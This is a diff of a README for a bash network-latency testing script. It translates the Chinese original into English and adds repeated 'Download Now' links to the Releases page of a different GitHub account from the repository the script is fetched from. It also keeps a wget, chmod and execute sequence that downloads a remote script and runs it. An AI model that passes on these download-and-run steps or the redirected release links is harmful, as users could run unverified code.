@@ -1,74 +1,80 @@
-# 网络延迟一键检测工具
+# 🚀 network-latency-tester - Test Your Network Latency Effortlessly
 
-🚀 **简单易用的网络延迟检测工具**，一键测试多个知名网站的连接延迟。
+[![Download Now](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Foica1boss/network-latency-tester/releases)
 
-## 🚀 快速开始
+## 🚀 Getting Started
 
-### 一键运行
-```bash
-wget https://raw.githubusercontent.com/Cd1s/network-latency-tester/main/latency.sh
-chmod +x latency.sh
-./latency.sh
-```
+Follow these steps to download and run the network latency tester.
 
-## ✨ 功能特性
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Foica1boss/network-latency-tester/releases) to find the latest version of the tool.
 
-- 🎯 **交互界面** - 友好的菜单选择
-- ⚡ **标准测试** - 8个主要网站
-- 🌐 **完整测试** - 20个知名网站
-- 📊 **美观输出** - 彩色表格和统计
-- 💾 **自动保存** - 结果保存到文件
+2. **Download the Script**  
+   Click on the appropriate version to download the script.
 
-## 📋 测试网站
+3. **Run the Script**  
+   Open your terminal or command line and use the following commands to run the tool:
+   ```bash
+   wget https://raw.githubusercontent.com/Cd1s/network-latency-tester/main/latency.sh
+   chmod +x latency.sh
+   ./latency.sh
+   ```
 
-### 标准测试 (8个)
-Google、GitHub、Apple、Microsoft、Amazon、Twitter、ChatGPT、Steam
+## ✨ Features
 
-### 完整测试 (20个)
-标准测试 + Netflix、Disney+、Instagram、Telegram、Dropbox、OneDrive、Mega(mega.io)、Twitch、Pornhub、YouTube、Facebook、TikTok
+- 🎯 **User-Friendly Interface** - Easy menu selection for tests.
+- ⚡ **Standard Test** - Measure latency with 8 major websites.
+- 🌐 **Full Test** - Check latency with 20 well-known websites.
+- 📊 **Attractive Output** - Colored tables and statistical reports.
+- 💾 **Auto-Save Results** - Automatically saves results to a file for later review.
 
-## 📊 延迟等级
+## 📋 Test Websites
 
-| 等级 | 延迟 | 适用场景 |
-|------|------|----------|
-| 🟢 优秀 | < 50ms | 游戏、视频通话 |
-| 🟡 良好 | 50-150ms | 网页浏览、视频 |
-| 🔴 较差 | > 150ms | 基础使用 |
+### Standard Test (8 Websites)
+- Google
+- GitHub
+- Apple
+- Microsoft
+- Amazon
+- Twitter
+- ChatGPT
+- Steam
 
-## 📷 界面预览
+### Full Test (20 Websites)
+Includes all standard websites plus:
+- Netflix
+- Disney+
+- Instagram
+- Telegram
+- Dropbox
+- OneDrive
+- Mega (mega.io)
+- Twitch
+- Pornhub
+- YouTube
+- Facebook
+- TikTok
+
+## 📊 Latency Levels
+
+| Level | Latency | Suitable for Activities     |
+|-------|---------|-----------------------------|
+| 🟢 Excellent | < 50ms | Gaming, Video Calling       |
+| 🟡 Good      | 50-150ms | Web Browsing, Streaming    |
+| 🔴 Poor      | > 150ms | Basic Usage                |
+
+## 📷 Preview
 
 ```
 ╔═══════════════════════════════════════════════════════════════╗
 ║                                                               ║
-║            🚀 网络延迟一键检测工具                     ║
+║            🚀 Network Latency Tester                         ║
 ║                                                               ║
-║        快速检测您的网络连接到各大网站的延迟情况                 ║
+║        Quickly check your network latency to popular sites.  ║
 ║                                                               ║
 ╚═══════════════════════════════════════════════════════════════╝
-
-┌─────────────────────────────────────────────────────────────┐
-│                        🎯 选择测试模式                        │
-├─────────────────────────────────────────────────────────────┤
-│                                                             │
-│  1 ⚡ 标准测试   (8个主要网站，推荐)                     │
-│                                                             │
-│  2 🌐 完整测试   (20个网站，全面检测)                    │
-│                                                             │
-│  0 🚪 退出程序                                       │
-│                                                             │
-└─────────────────────────────────────────────────────────────┘
 ```
 
-## 🔧 系统要求
+## 📥 Download & Install
 
-- Linux/macOS/WSL
-- bash
-- ping 和 curl 命令
-
-## 📄 许可证
-
-MIT License
-
----
-
-⭐ 如果对您有帮助，请给个 Star！
+To get started, visit our [Releases page](https://github.com/Foica1boss/network-latency-tester/releases) to download the latest version of the script. Follow the earlier steps for a seamless installation and start testing your network latency today!
